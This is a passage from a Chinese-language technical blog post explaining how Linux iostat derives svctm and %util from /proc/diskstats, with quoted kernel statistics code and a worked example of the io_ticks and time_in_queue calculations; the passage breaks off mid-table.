&#x7C7B;&#x6BD4;&#x4E8E;&#x5C06;&#x4E00;&#x5BB6;&#x8D2D;&#x5F97;&#x4E1C;&#x897F;&#x6C47;&#x603B;&#x4E00;&#x8D77;&#xFF0C;&#x4ED8;&#x8D39;&#x4E00;&#x6B21;&#x3002;&#x8FD8;&#x6709;svctm&#x548C;%util&#x4E24;&#x4E2A;&#x6CA1;&#x6709;&#x4ECB;&#x7ECD;&#x3002;</p><p>&#x6309;&#x7167;&#x6211;&#x4EEC;&#x7684;&#x5267;&#x60C5;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x7136;&#x800C;&#x7136;&#x5730;&#x53EF;&#x4EE5;&#x5C06;svctm&#x7C7B;&#x6BD4;&#x6210;&#x6536;&#x94F6;&#x670D;&#x52A1;&#x5458;&#x670D;&#x52A1;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x9700;&#x8981;&#x7684;&#x5E73;&#x5747;&#x65F6;&#x95F4;&#xFF0C;%util&#x7C7B;&#x6BD4;&#x6210;&#x6536;&#x94F6;&#x670D;&#x52A1;&#x5458;&#x5DE5;&#x4F5C;&#x7684;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;&#x3002;</p><p>&#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x7C7B;&#x6BD4;&#x662F;&#x9519;&#x8BEF;&#x7684;&#xFF0C;&#x5C31;&#x662F;&#x56E0;&#x4E3A;&#x7C7B;&#x4F3C;&#x7684;&#x7C7B;&#x6BD4;&#xFF0C;&#x5BB9;&#x6613;&#x8BA9;&#x4EBA;&#x9677;&#x5165;&#x8BEF;&#x533A;&#x4E0D;&#x80FD;&#x81EA;&#x62D4;&#x3002;&#x4E0D;&#x80FD;&#x7B80;&#x5355;&#x5730;&#x5C06;svctm&#x7406;&#x89E3;&#x6210;&#x5355;&#x4E2A;IO&#x88AB;&#x5757;&#x8BBE;&#x5907;&#x5904;&#x7406;&#x7684;&#x6709;&#x6548;&#x65F6;&#x95F4;&#xFF0C;&#x540C;&#x65F6;&#x4E0D;&#x80FD;&#x7406;&#x89E3;&#x6210;%util&#x5230;&#x4E86;100% &#xFF0C;&#x78C1;&#x76D8;&#x5DE5;&#x4F5C;&#x5C31;&#x9971;&#x548C;&#x4E86;&#xFF0C;&#x4E0D;&#x80FD;&#x7EE7;&#x7EED;&#x63D0;&#x5347;&#x4E86;&#xFF0C;&#x8FD9;&#x662F;&#x4E24;&#x4E2A;&#x5E38;&#x89C1;&#x7684;&#x8BEF;&#x533A;&#x3002;</p><p>svctm&#x548C;%util&#x662F;iostat&#x6700;&#x5BB9;&#x6613;&#x5F15;&#x8D77;&#x8BEF;&#x89E3;&#x7684;&#x4E24;&#x4E2A;&#x8F93;&#x51FA;&#x3002;&#x4E3A;&#x4E86;&#x51C6;&#x786E;&#x5730;&#x8BC4;&#x4F30;&#x5757;&#x8BBE;&#x5907;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x5F97;&#x5230;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x6570;&#x503C;&#xFF1A;&#x5373;&#x4E00;&#x4E2A;io&#x4ECE;&#x53D1;&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x5C42;&#x5230;&#x5B8C;&#x6210;&#x8FD9;&#x4E2A;io&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x5176;&#x4ED6;&#x5728;&#x961F;&#x5217;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x4ECE;&#x8868;&#x9762;&#x770B;&#xFF0C;svctm&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x503C;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#x5E76;&#x975E;&#x5982;&#x6B64;&#x3002;</p><p>Linux&#x4E0B;iostat&#x8F93;&#x51FA;&#x7684;svctm&#x5E76;&#x4E0D;&#x5177;&#x5907;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x542B;&#x4E49;&#xFF0C;&#x8FD9;&#x4E2A;&#x6307;&#x6807;&#x5E94;&#x8BE5;&#x975E;&#x5E9F;&#x5F03;&#x3002;iostat&#x548C;sar&#x7684;man page&#x90FD;&#x6709;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x8B66;&#x544A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svctm</span><br><span class="line">The average  service time (<span class="keyword">in</span> milliseconds) <span class="keyword">for</span> I/O requests that were issued to the device. Warning! Do not trust this field any more.  This field will be removed <span class="keyword">in</span> a future sysstat version.</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x90A3;&#x4E48;iostat&#x8F93;&#x51FA;&#x4E2D;&#x7684;svctm&#x5230;&#x5E95;&#x662F;&#x600E;&#x4E48;&#x6765;&#x7684;&#xFF0C;%util&#x53C8;&#x662F;&#x600E;&#x4E48;&#x7B97;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x8FDB;&#x800C;iostat&#x7684;&#x8F93;&#x51FA;&#x7684;&#x5404;&#x4E2A;&#x5B57;&#x6BB5;&#x90FD;&#x662F;&#x4ECE;&#x54EA;&#x91CC;&#x62FF;&#x5230;&#x7684;&#x4FE1;&#x606F;&#x5462;&#xFF1F;</p><h2 id="iostat&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x6765;&#x6E90;diskstats"><a href="#iostat&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x6765;&#x6E90;diskstats" class="headerlink" title="iostat&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x6765;&#x6E90;diskstats"></a>iostat&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x6765;&#x6E90;diskstats</h2><h4 id="iostat&#x6570;&#x636E;&#x7684;&#x6765;&#x6E90;&#x662F;-Linux-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;-proc-diskstats"><a href="#iostat&#x6570;&#x636E;&#x7684;&#x6765;&#x6E90;&#x662F;-Linux-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;-proc-diskstats" class="headerlink" title="iostat&#x6570;&#x636E;&#x7684;&#x6765;&#x6E90;&#x662F; Linux &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684; /proc/diskstats"></a>iostat&#x6570;&#x636E;&#x7684;&#x6765;&#x6E90;&#x662F; Linux &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684; /proc/diskstats</h4><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/proc_diskstats.png" title="proc_diskstats"><h6 id="&#x6CE8;&#x610F;&#xFF0C;procfs&#x4E2D;&#x7684;&#x524D;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#xFF1A;&#x4E3B;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x4ECE;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x8BBE;&#x5907;&#x540D;&#x3002;"><a href="#&#x6CE8;&#x610F;&#xFF0C;procfs&#x4E2D;&#x7684;&#x524D;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#xFF1A;&#x4E3B;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x4ECE;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x8BBE;&#x5907;&#x540D;&#x3002;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;procfs&#x4E2D;&#x7684;&#x524D;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#xFF1A;&#x4E3B;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x4ECE;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x8BBE;&#x5907;&#x540D;&#x3002;"></a>&#x6CE8;&#x610F;&#xFF0C;procfs&#x4E2D;&#x7684;&#x524D;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#xFF1A;&#x4E3B;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x4ECE;&#x8BBE;&#x5907;&#x53F7;&#x3001;&#x8BBE;&#x5907;&#x540D;&#x3002;</h6><h5 id="&#x4ECE;&#x7B2C;&#x56DB;&#x4E2A;&#x5B57;&#x6BB5;&#x5F00;&#x59CB;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x76F8;&#x5173;&#x7EDF;&#x8BA1;&#xFF1A;"><a href="#&#x4ECE;&#x7B2C;&#x56DB;&#x4E2A;&#x5B57;&#x6BB5;&#x5F00;&#x59CB;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x76F8;&#x5173;&#x7EDF;&#x8BA1;&#xFF1A;" class="headerlink" title="&#x4ECE;&#x7B2C;&#x56DB;&#x4E2A;&#x5B57;&#x6BB5;&#x5F00;&#x59CB;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x76F8;&#x5173;&#x7EDF;&#x8BA1;&#xFF1A;"></a>&#x4ECE;&#x7B2C;&#x56DB;&#x4E2A;&#x5B57;&#x6BB5;&#x5F00;&#x59CB;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x76F8;&#x5173;&#x7EDF;&#x8BA1;&#xFF1A;</h5><ul><li>(rd_ios) : &#x8BFB;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>(rd_merges):&#x5408;&#x5E76;&#x8BFB;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;&#x3002;&#x5982;&#x679C;&#x4E24;&#x4E2A;&#x8BFB;&#x64CD;&#x4F5C;&#x8BFB;&#x53D6;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x88AB;&#x5408;&#x5E76;&#x6210;1&#x4E2A;&#x3002;</li><li>(rd_sectors): &#x8BFB;&#x53D6;&#x7684;&#x6247;&#x533A;&#x6570;&#x91CF;</li><li>(rd_ticks):&#x8BFB;&#x64CD;&#x4F5C;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#xFF08;&#x4EE5;&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#xFF09;&#x3002;&#x6BCF;&#x4E2A;&#x8BFB;&#x64CD;&#x4F5C;&#x4ECE;__make_request()&#x5F00;&#x59CB;&#x8BA1;&#x65F6;&#xFF0C;&#x5230;end_that_request_last()&#x4E3A;&#x6B62;&#xFF0C;&#x5305;&#x62EC;&#x4E86;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#x3002;</li><li>(wr_ios):&#x5199;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>(wr_merges):&#x5408;&#x5E76;&#x5199;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>(wr_sectors): &#x5199;&#x5165;&#x7684;&#x6247;&#x533A;&#x6570;&#x91CF;</li><li>(wr_ticks): &#x5199;&#x64CD;&#x4F5C;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#xFF08;&#x4EE5;&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#xFF09;</li><li>(in_flight): &#x5F53;&#x524D;&#x672A;&#x5B8C;&#x6210;&#x7684;I/O&#x6570;&#x91CF;&#x3002;&#x5728;I/O&#x8BF7;&#x6C42;&#x8FDB;&#x5165;&#x961F;&#x5217;&#x65F6;&#x8BE5;&#x503C;&#x52A0;1&#xFF0C;&#x5728;I/O&#x7ED3;&#x675F;&#x65F6;&#x8BE5;&#x503C;&#x51CF;1&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x662F;I/O&#x8BF7;&#x6C42;&#x8FDB;&#x5165;&#x961F;&#x5217;&#x65F6;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x63D0;&#x4EA4;&#x7ED9;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x65F6;</li><li>(io_ticks)&#x8BE5;&#x8BBE;&#x5907;&#x7528;&#x4E8E;&#x5904;&#x7406;I/O&#x7684;&#x81EA;&#x7136;&#x65F6;&#x95F4;(wall-clock time)</li><li>(time_in_queue): &#x5BF9;&#x5B57;&#x6BB5;#10(io_ticks)&#x7684;&#x52A0;&#x6743;&#x503C;</li></ul><h5 id="&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x5927;&#x591A;&#x6765;&#x81EA;&#x5185;&#x6838;&#x7684;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;"><a href="#&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x5927;&#x591A;&#x6765;&#x81EA;&#x5185;&#x6838;&#x7684;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;" class="headerlink" title="&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x5927;&#x591A;&#x6765;&#x81EA;&#x5185;&#x6838;&#x7684;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;"></a>&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x5927;&#x591A;&#x6765;&#x81EA;&#x5185;&#x6838;&#x7684;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include/linux/genhd.h</span><br><span class="line">struct disk_stats {</span><br><span class="line">        unsigned long sectors[2];       /* READs and WRITEs */</span><br><span class="line">        unsigned long ios[2];</span><br><span class="line">        unsigned long merges[2];</span><br><span class="line">        unsigned long ticks[2];</span><br><span class="line">        unsigned long io_ticks;</span><br><span class="line">        unsigned long time_in_queue;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x9664;&#x4E86;in-flight&#x6765;&#x81EA;&#xFF1A;"><a href="#&#x9664;&#x4E86;in-flight&#x6765;&#x81EA;&#xFF1A;" class="headerlink" title="&#x9664;&#x4E86;in_flight&#x6765;&#x81EA;&#xFF1A;"></a>&#x9664;&#x4E86;in_flight&#x6765;&#x81EA;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">part_in_flight(hd), </span><br><span class="line">static inline int part_in_flight(struct hd_struct *part)</span><br><span class="line">{</span><br><span class="line">        return atomic_read(&amp;part-&gt;in_flight[0]) + atomic_read(&amp;part-&gt;in_flight[1]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x5185;&#x6838;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;"><a href="#&#x5185;&#x6838;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;" class="headerlink" title="&#x5185;&#x6838;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;"></a>&#x5185;&#x6838;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">while ((hd = disk_part_iter_next(&amp;piter))) {</span><br><span class="line">  cpu = part_stat_lock();</span><br><span class="line">  part_round_stats(cpu, hd);</span><br><span class="line">  part_stat_unlock();</span><br><span class="line">  seq_printf(seqf, &quot;%4d %7d %s %lu %lu %llu &quot;</span><br><span class="line">         &quot;%u %lu %lu %llu %u %u %u %u\n&quot;,</span><br><span class="line">         MAJOR(part_devt(hd)), MINOR(part_devt(hd)),</span><br><span class="line">         disk_name(gp, hd-&gt;partno, buf),</span><br><span class="line">         part_stat_read(hd, ios[READ]),</span><br><span class="line">         part_stat_read(hd, merges[READ]),</span><br><span class="line">         (unsigned long long)part_stat_read(hd, sectors[READ]),</span><br><span class="line">         jiffies_to_msecs(part_stat_read(hd, ticks[READ])),</span><br><span class="line">         part_stat_read(hd, ios[WRITE]),</span><br><span class="line">         part_stat_read(hd, merges[WRITE]),</span><br><span class="line">         (unsigned long long)part_stat_read(hd, sectors[WRITE]),</span><br><span class="line">         jiffies_to_msecs(part_stat_read(hd, ticks[WRITE])),</span><br><span class="line">         part_in_flight(hd),</span><br><span class="line">         jiffies_to_msecs(part_stat_read(hd, io_ticks)),</span><br><span class="line">         jiffies_to_msecs(part_stat_read(hd, time_in_queue))</span><br><span class="line">      );</span><br></pre></td></tr></tbody></table></figure><h2 id="io-ticks-and-time-in-queue"><a href="#io-ticks-and-time-in-queue" class="headerlink" title="io_ticks and time_in_queue"></a>io_ticks and time_in_queue</h2><p>&#x8FD9;&#x91CC;&#x9762;&#x5927;&#x90E8;&#x5206;&#x5B57;&#x6BB5;&#x90FD;&#x662F;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x7684;&#xFF0C;&#x7A0D;&#x5FAE;&#x96BE;&#x7406;&#x89E3;&#x7684;&#x5728;&#x4E8E;io_ticks&#x3002;&#x521D;&#x770B;&#x4E4B;&#x4E0B;&#xFF0C;&#x660E;&#x660E;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;rd_ticks&#x548C;wr_ticks &#x4E3A;&#x4EC0;&#x4E48;&#x8FD8;&#x9700;&#x4E00;&#x4E2A;io_ticks&#x3002;&#x6CE8;&#x610F;rd_ticks&#x548C;wr_ticks&#x662F;&#x628A;&#x6BCF;&#x4E00;&#x4E2A;IO&#x6D88;&#x8017;&#x65F6;&#x95F4;&#x7D2F;&#x52A0;&#x8D77;&#x6765;&#xFF0C;&#x4F46;&#x662F;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E00;&#x822C;&#x53EF;&#x4EE5;&#x5E76;&#x884C;&#x5904;&#x7406;&#x591A;&#x4E2A;IO&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;rd_ticks&#x548C;wr_ticks&#x4E4B;&#x548C;&#x4E00;&#x822C;&#x4F1A;&#x6BD4;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#xFF08;wall-clock time&#xFF09;&#x8981;&#x5927;&#x3002;&#x800C;io_ticks &#x4E0D;&#x5173;&#x5FC3;&#x961F;&#x5217;&#x4E2D;&#x6709;&#x591A;&#x5C11;&#x4E2A;IO&#x5728;&#x6392;&#x961F;&#xFF0C;&#x5B83;&#x53EA;&#x5173;&#x5FC3;&#x8BBE;&#x5907;&#x6709;IO&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5373;&#x4E0D;&#x8003;&#x8651;IO&#x6709;&#x591A;&#x5C11;&#xFF0C;&#x53EA;&#x8003;&#x8651;IO&#x6709;&#x6CA1;&#x6709;&#x3002;&#x5728;&#x5B9E;&#x9645;&#x8FD0;&#x7B97;&#x4E2D;&#xFF0C;in_flight&#x4E0D;&#x662F;0&#x7684;&#x65F6;&#x5019;&#x4FDD;&#x6301;&#x8BA1;&#x65F6;&#xFF0C;&#x800C;in_flight &#x7B49;&#x4E8E;0&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x65F6;&#x95F4;&#x4E0D;&#x7D2F;&#x52A0;&#x5230;io_ticks&#x3002;</p><p>&#x4E0B;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x96BE;&#x7406;&#x89E3;&#x7684;&#x662F;time_in_queue&#x8FD9;&#x4E2A;&#x503C;&#xFF0C;&#x5B83;&#x7684;&#x8BA1;&#x7B97;&#x662F;&#x5F53;&#x524D;IO&#x6570;&#x91CF;&#xFF08;&#x5373;in_flight&#x7684;&#x503C;&#xFF09;&#x4E58;&#x4EE5;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x3002;&#x8868;&#x9762;&#x770B;&#x8BE5;&#x53D8;&#x91CF;&#x7684;&#x540D;&#x5B57;&#x53EB;time_in_queue&#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5E76;&#x4E0D;&#x53EA;&#x662F;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#x3002;</p><p>&#x6709;&#x4EBA;&#x4E0D;&#x7406;&#x89E3;time_in_queue&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x76F8;&#x4FE1;&#x8BFB;&#x8FC7;&#x5C0F;&#x5B66; &#x542C;&#x8FC7;&#x4E0B;&#x9762;&#x8FD9;&#x53E5;&#x8BDD;&#x7684;&#x5C0F;&#x670B;&#x53CB;&#x90FD;&#x4F1A;&#x7406;&#x89E3;time_in_queue&#xFF1A;</p><blockquote><p>&#x56E0;&#x4E3A;&#x4F60;&#x4E0A;&#x8BFE;&#x8BB2;&#x8BDD;&#xFF0C; &#x8BA9;&#x8001;&#x5E08;&#x6279;&#x8BC4;&#x4F60;5&#x5206;&#x949F;&#xFF0C;&#x73ED;&#x91CC;&#x6709;50&#x4EBA;&#xFF0C;50&#x4E2A;&#x4EBA;&#x4F60;&#x5C31;&#x6D6A;&#x8D39;&#x4E86;&#x5168;&#x73ED;250&#x5206;&#x949F;&#x3002;</p></blockquote><p>&#x8FD9;&#x6BB5;&#x8BDD;&#x975E;&#x5E38;&#x5F62;&#x8C61;&#x5730;&#x4ECB;&#x7ECD;&#x4E86;time_in_queue&#x7684;&#x8BA1;&#x7B97;&#x6CD5;&#x5219;&#xFF0C;&#x5373;&#x81EA;&#x7136;&#x65F6;&#x95F4;&#x53EA;&#x8FC7;&#x53BB;&#x4E86;5&#x5206;&#x949F;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x540C;&#x5B66;&#xFF0C;&#x54E6;&#x4E0D;&#xFF0C;&#x6240;&#x6709;IO&#x6765;&#x8BF4;&#xFF0C;&#x9700;&#x8981;&#x52A0;&#x6743;&#x8BA1;&#x7B97;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">static void part_round_stats_single(int cpu, struct hd_struct *part,</span><br><span class="line">                  unsigned long now)</span><br><span class="line">{</span><br><span class="line">  if (now == part-&gt;stamp)</span><br><span class="line">      return;</span><br><span class="line">   </span><br><span class="line">  /*&#x5982;&#x679C;&#x961F;&#x5217;&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x5B58;&#x5728;in_flight io*/</span><br><span class="line">  if (part_in_flight(part)) {</span><br><span class="line">     </span><br><span class="line">      /*&#x5C0F;&#x5B66;&#x6570;&#x5B66;&#x8001;&#x5E08;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;now-part-&gt;stamp &#x4E58;&#x4EE5;&#x73ED;&#x7EA7;&#x4EBA;&#x6570;&#xFF0C;&#x54E6;&#x4E0D;&#xFF0C;&#x662F;&#x4E58;&#x4EE5;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x7684;io&#x8BF7;&#x6C42;&#x4E2A;&#x6570;*/</span><br><span class="line">      __part_stat_add(cpu, part, time_in_queue,</span><br><span class="line">              part_in_flight(part) * (now - part-&gt;stamp));</span><br><span class="line">     </span><br><span class="line">     /*&#x5982;&#x5B9E;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6279;&#x8BC4;&#x8C03;&#x76AE;&#x5B66;&#x751F;&#xFF0C;&#x6D6A;&#x8D39;&#x4E86;5&#x5206;&#x949F;&#x3002;io&#x4E0D;&#x662F;&#x7A7A;&#x7684;&#x65F6;&#x95F4;&#x589E;&#x52A0;now - part-&gt;stamp*/</span><br><span class="line">      __part_stat_add(cpu, part, io_ticks, (now - part-&gt;stamp));</span><br><span class="line">  }</span><br><span class="line">  part-&gt;stamp = now;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x8BA1;&#x7B97;&#x7684;&#x65B9;&#x6CD5;&#x5F88;&#x7B80;&#x5355;&#xFF1A;</p><ul><li>&#x5F53;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;<ul><li>io_ticks&#x4E0D;&#x589E;&#x52A0;</li><li>time_in_queue&#x4E0D;&#x589E;&#x52A0;</li><li>part-&gt;stamp &#x66F4;&#x65B0;&#x4E3A;now</li></ul></li><li>&#x5F53;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x4E0D;&#x662F;&#x7A7A;&#x7684;&#x65F6;&#x5019;<ul><li>io_ticks&#x589E;&#x52A0;&#xFF0C; &#x589E;&#x52A0;&#x91CF;&#x4E3A; now - part-&gt;timestamp</li><li>time_in_queue&#x589E;&#x52A0;&#xFF0C;&#x589E;&#x52A0;&#x91CF;&#x4E3A; &#x5728;&#x961F;&#x5217;&#x4E2D;IO&#x7684;&#x4E2A;&#x6570;&#x4E58;&#x4EE5; (now - part-&gt;stamp)</li><li>part-&gt;stamp &#x66F4;&#x65B0;&#x4E3A;now</li></ul></li><li>&#x6CE8;&#x610F;&#x8C03;&#x7528;part_round_stats_single&#x51FD;&#x6570;&#x7684;&#x65F6;&#x673A;&#x5728;&#x4E8E;<ul><li>&#x5728;&#x65B0;IO&#x8BF7;&#x6C42;&#x63D2;&#x5165;&#x961F;&#x5217;&#xFF08;&#x88AB;merge&#x7684;&#x4E0D;&#x7B97;&#xFF09;</li><li>&#x5B8C;&#x6210;&#x4E00;&#x4E2A;IO&#x8BF7;&#x6C42;</li></ul></li></ul><p>&#x7A7A;&#x8BF4;&#x592A;&#x8FC7;&#x62BD;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#x6765;&#x4ECB;&#x7ECD;io_ticks&#x548C;time_in_queue&#x7684;&#x8BA1;&#x7B97;</p><table><thead><tr><th style="text-align:right">ID Time</th><th style="text-align:center">Ops</th><th style="text-align:center">in_flight</th><th style="text-align:center">stamp</th><th style="text-align:center">stamp_delta</th><th style="text-align:center">io_ticks</th><th style="text-align:center">time_in_queue</th></tr></thead><tbody><tr><td style="text-align:right">0</td><td style="text-align:center">100 &#x65B0;&#x8BF7;&#x6C42;&#x5165;&#x961F;&#x5217;</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">&#x65E0;&#x9700;&#x8BA1;&#x7B97;</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:right">1</td><td style="text-align:center">100.10 &#x65B0;&#x8BF7;&#x6C42;&#x5165;&#x961F;&#x5217;</td><td style="text-align:center">1</td><td style="text-align:center">100</td><td style="text-align:center">100.10-100 = 0.1</td><td style="text-align:center">0.1</td><td style="text-align:center">0.1</td></tr><tr><td style="text-align:right">2</td><td style="text-align:center">101.20 &#x5B8C;&#x6210;&#x4E00;&#x4E2A;IO&#x8BF7;&#x6C42;</td><td style="text-align:center">2</td><td style="text-align:center">100.10</td><td style="text-align:center">101.20-100.10 = 1.1</td><td style="text-align:center">1.2</td><td style="text-align:center">0.1+1.1*2 = 2.3</td></tr><tr><td style="text-align:right">3</td><td style="text-align:center">103.60 &#x5B8C;&#x6210;&#x4E00;&#x4E2A;IO&#x8BF7;&#x6C42;</td><td style="text-align:center">1</td><td style="text-align:center">101.20</td><td style="text-align:center">103.60-101.20 = 2.4</td><td style="text-align:center">3.6</td><td style="text-align:center">2.3+2.4*1=4.7</td></tr><tr><td style="text-align:right">4</td><td style="text-align:center">153.60 &#x65B0;&#x8BF7;&#x6C42;&#x5165;&#x961F;&#x5217;</td><td style="text-align:center">0</td><td style="text-align:center">103.60</td><td style="text-align:center">&#x65E0;&#x9700;&#x8BA1;&#x7B97;</td><td style="text-align:center">3.6</td><td style="text-align:center">4.7</td></tr><tr><td style="text-align:right">5</td><td style="text-align:center">153.90 &#x5B8C;&#x6210;&#x4E00;&#x4E2A;IO&#x8BF7;&#x6C42;</td><td style="text-align:center">1</td><td style="text-align:center">153.60</td><td style="text-align:center">153.90 - 153.60 = 0.3</td><td style="text-align:center">3.9</td><td style="text-align:center">4.7+0.3 * 1= 